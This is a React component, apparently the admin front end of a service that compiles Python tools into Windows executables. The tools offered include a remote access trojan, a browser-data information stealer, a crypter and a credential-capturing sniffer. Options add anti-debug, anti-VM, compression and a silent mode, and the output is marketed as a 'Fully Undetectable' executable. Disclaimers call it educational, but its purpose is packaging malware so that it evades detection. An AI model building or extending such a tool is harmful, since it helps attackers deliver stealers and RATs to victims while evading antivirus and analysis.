import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Switch } from "@/components/ui/switch";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { 
  Package, 
  Download, 
  Settings, 
  Shield, 
  Zap,
  FileCode,
  AlertTriangle,
  CheckCircle,
  Loader2
} from "lucide-react";
import { useMutation, useQuery } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";

interface BuildConfig {
  toolType: string;
  outputName: string;
  console: boolean;
  compression: boolean;
  antiDebug: boolean;
  antiVM: boolean;
  icon?: string;
  hiddenImports: string[];
}

interface BuildResult {
  success: boolean;
  buildId: string;
  executable: string;
  buildLog: string;
  downloadUrl: string;
}

export default function ExecutableBuilder() {
  const [config, setConfig] = useState<BuildConfig>({
    toolType: 'elite_toolkit',
    outputName: 'security_tool',
    console: false,
    compression: true,
    antiDebug: true,
    antiVM: true,
    hiddenImports: ['cryptography', 'requests', 'psutil', 'PIL']
  });
  
  const [buildResult, setBuildResult] = useState<BuildResult | null>(null);
  const [buildLog, setBuildLog] = useState('');

  // Build executable mutation
  const buildExecutable = useMutation({
    mutationFn: async (config: BuildConfig) => {
      const response = await fetch('/api/admin/build-executable', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ toolType: config.toolType, config })
      });
      if (!response.ok) throw new Error('Build failed');
      return response.json();
    },
    onSuccess: (data: BuildResult) => {
      setBuildResult(data);
      setBuildLog(data.buildLog || '');
    }
  });

  // Fetch available Python tools
  const { data: availableTools } = useQuery({
    queryKey: ['/api/admin/python-tools'],
    queryFn: async () => {
      return {
        tools: [
          { id: 'elite_toolkit', name: 'Elite Toolkit', description: 'Complete cybersecurity toolkit with crypter, binder, stealer' },
          { id: 'millennium_rat', name: 'Millennium RAT', description: 'Advanced remote access tool with network sniffing' },
          { id: 'crypter', name: 'Advanced Crypter', description: 'Multi-layer file encryption and obfuscation' },
          { id: 'stealer', name: 'Information Stealer', description: 'Browser data and system information collection' },
          { id: 'network_sniffer', name: 'Network Sniffer', description: 'Real-time credential capture and monitoring' }
        ]
      };
    }
  });

  const handleBuild = () => {
    buildExecutable.mutate(config);
  };

  const handleDownload = () => {
    if (buildResult?.downloadUrl) {
      window.open(buildResult.downloadUrl, '_blank');
    }
  };

  const toolDescriptions = {
    elite_toolkit: "Complete cybersecurity education toolkit with crypter, binder, stealer, and RAT functionality",
    millennium_rat: "Advanced remote access tool with comprehensive network monitoring and credential capture",
    crypter: "Multi-layer file encryption with anti-debugging and anti-VM protection",
    stealer: "Educational information collection tool for browser data and system analysis",
    network_sniffer: "Real-time network traffic monitoring with credential extraction"
  };

  return (
    <div className="space-y-6">
      <Card className="border-purple-800 bg-purple-950/20">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-purple-400">
            <Package className="h-5 w-5" />
            Python Executable Builder
            <Badge variant="secondary" className="ml-auto bg-purple-900 text-purple-200">
              ADMIN ONLY
            </Badge>
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-6">
          <Alert className="border-yellow-600 bg-yellow-950/20">
            <AlertTriangle className="h-4 w-4 text-yellow-400" />
            <AlertDescription className="text-yellow-400">
              This tool compiles Python cybersecurity tools into standalone executables using PyInstaller. 
              Only for authorized educational and testing purposes.
            </AlertDescription>
          </Alert>

          <Tabs defaultValue="config" className="w-full">
            <TabsList className="grid w-full grid-cols-3">
              <TabsTrigger value="config">Configuration</TabsTrigger>
              <TabsTrigger value="build">Build Process</TabsTrigger>
              <TabsTrigger value="download">Download</TabsTrigger>
            </TabsList>

            <TabsContent value="config" className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="toolType">Python Tool</Label>
                  <Select 
                    value={config.toolType} 
                    onValueChange={(value) => setConfig({...config, toolType: value})}
                  >
                    <SelectTrigger>
                      <SelectValue placeholder="Select tool to build" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="elite_toolkit">Elite Toolkit</SelectItem>
                      <SelectItem value="millennium_rat">Millennium RAT</SelectItem>
                      <SelectItem value="crypter">Advanced Crypter</SelectItem>
                      <SelectItem value="stealer">Information Stealer</SelectItem>
                      <SelectItem value="network_sniffer">Network Sniffer</SelectItem>
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground">
                    {toolDescriptions[config.toolType as keyof typeof toolDescriptions]}
                  </p>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="outputName">Output Name</Label>
                  <Input
                    id="outputName"
                    placeholder="executable_name"
                    value={config.outputName}
                    onChange={(e) => setConfig({...config, outputName: e.target.value})}
                  />
                  <p className="text-xs text-muted-foreground">
                    Name for the generated .exe file
                  </p>
                </div>
              </div>

              <div className="space-y-4">
                <h3 className="text-sm font-semibold text-purple-400">Build Options</h3>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="console">Console Window</Label>
                    <Switch
                      id="console"
                      checked={config.console}
                      onCheckedChange={(checked) => setConfig({...config, console: checked})}
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="compression">UPX Compression</Label>
                    <Switch
                      id="compression"
                      checked={config.compression}
                      onCheckedChange={(checked) => setConfig({...config, compression: checked})}
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="antiDebug">Anti-Debug Protection</Label>
                    <Switch
                      id="antiDebug"
                      checked={config.antiDebug}
                      onCheckedChange={(checked) => setConfig({...config, antiDebug: checked})}
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="antiVM">Anti-VM Detection</Label>
                    <Switch
                      id="antiVM"
                      checked={config.antiVM}
                      onCheckedChange={(checked) => setConfig({...config, antiVM: checked})}
                    />
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="hiddenImports">Hidden Imports</Label>
                <Textarea
                  id="hiddenImports"
                  placeholder="cryptography, requests, psutil, PIL"
                  value={config.hiddenImports.join(', ')}
                  onChange={(e) => setConfig({
                    ...config, 
                    hiddenImports: e.target.value.split(',').map(s => s.trim()).filter(Boolean)
                  })}
                  rows={3}
                />
                <p className="text-xs text-muted-foreground">
                  Comma-separated list of Python modules to include
                </p>
              </div>

              <Button
                onClick={handleBuild}
                disabled={buildExecutable.isPending}
                className="w-full"
                size="lg"
              >
                {buildExecutable.isPending ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Building Executable...
                  </>
                ) : (
                  <>
                    <Package className="mr-2 h-4 w-4" />
                    Build FUD Executable
                  </>
                )}
              </Button>
            </TabsContent>

            <TabsContent value="build" className="space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-lg font-semibold text-purple-400">Build Process</h3>
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${
                    buildExecutable.isPending ? 'bg-yellow-500 animate-pulse' : 
                    buildResult?.success ? 'bg-green-500' : 'bg-gray-500'
                  }`} />
                  <span className="text-sm">
                    {buildExecutable.isPending ? 'Building...' : 
                     buildResult?.success ? 'Build Complete' : 'Ready'}
                  </span>
                </div>
              </div>

              {buildExecutable.isPending && (
                <Alert className="border-yellow-600 bg-yellow-950/20">
                  <Loader2 className="h-4 w-4 text-yellow-400 animate-spin" />
                  <AlertDescription className="text-yellow-400">
                    PyInstaller is compiling your executable. This may take several minutes...
                  </AlertDescription>
                </Alert>
              )}

              {buildResult?.success && (
                <Alert className="border-green-600 bg-green-950/20">
                  <CheckCircle className="h-4 w-4 text-green-400" />
                  <AlertDescription className="text-green-400">
                    Executable built successfully! Ready for download.
                  </AlertDescription>
                </Alert>
              )}

              {buildLog && (
                <div className="space-y-2">
                  <Label>Build Log</Label>
                  <div className="bg-black/50 border rounded-md p-4 max-h-64 overflow-y-auto">
                    <pre className="text-xs text-green-400 font-mono whitespace-pre-wrap">
                      {buildLog}
                    </pre>
                  </div>
                </div>
              )}

              {buildResult && (
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <Card className="bg-background/50">
                    <CardContent className="p-4">
                      <div className="text-sm font-medium text-blue-400">
                        Build ID
                      </div>
                      <div className="text-xs font-mono text-muted-foreground">
                        {buildResult.buildId?.slice(0, 12)}...
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="bg-background/50">
                    <CardContent className="p-4">
                      <div className="text-sm font-medium text-green-400">
                        Tool Type
                      </div>
                      <div className="text-xs text-muted-foreground">
                        {config.toolType}
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="bg-background/50">
                    <CardContent className="p-4">
                      <div className="text-sm font-medium text-purple-400">
                        Features
                      </div>
                      <div className="text-xs text-muted-foreground">
                        {[
                          config.antiDebug && 'Anti-Debug',
                          config.antiVM && 'Anti-VM',
                          config.compression && 'Compressed',
                          !config.console && 'Silent'
                        ].filter(Boolean).join(', ') || 'Basic'}
                      </div>
                    </CardContent>
                  </Card>
                </div>
              )}
            </TabsContent>

            <TabsContent value="download" className="space-y-4">
              {buildResult?.success ? (
                <div className="space-y-4">
                  <Alert className="border-green-600 bg-green-950/20">
                    <CheckCircle className="h-4 w-4 text-green-400" />
                    <AlertDescription className="text-green-400">
                      Your FUD executable is ready for download. The file has been compiled with 
                      PyInstaller and includes all specified protections.
                    </AlertDescription>
                  </Alert>

                  <Card className="bg-background/50">
                    <CardContent className="p-6 text-center space-y-4">
                      <FileCode className="h-12 w-12 text-purple-400 mx-auto" />
                      <div>
                        <h3 className="text-lg font-semibold text-purple-400">
                          {config.outputName}.exe
                        </h3>
                        <p className="text-sm text-muted-foreground">
                          Fully Undetectable Executable
                        </p>
                      </div>
                      
                      <div className="flex flex-wrap gap-2 justify-center">
                        {config.antiDebug && <Badge variant="outline">Anti-Debug</Badge>}
                        {config.antiVM && <Badge variant="outline">Anti-VM</Badge>}
                        {config.compression && <Badge variant="outline">Compressed</Badge>}
                        {!config.console && <Badge variant="outline">Silent</Badge>}
                      </div>

                      <Button onClick={handleDownload} size="lg" className="w-full">
                        <Download className="mr-2 h-4 w-4" />
                        Download Executable
                      </Button>
                    </CardContent>
                  </Card>

                  <Alert className="border-red-600 bg-red-950/20">
                    <Shield className="h-4 w-4 text-red-400" />
                    <AlertDescription className="text-red-400">
                      <strong>Security Notice:</strong> This executable is for educational and 
                      authorized testing purposes only. Ensure you have proper authorization 
                      before deployment.
                    </AlertDescription>
                  </Alert>
                </div>
              ) : (
                <Alert>
                  <AlertDescription>
                    No executable available for download. Build an executable first using the Configuration tab.
                  </AlertDescription>
                </Alert>
              )}
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}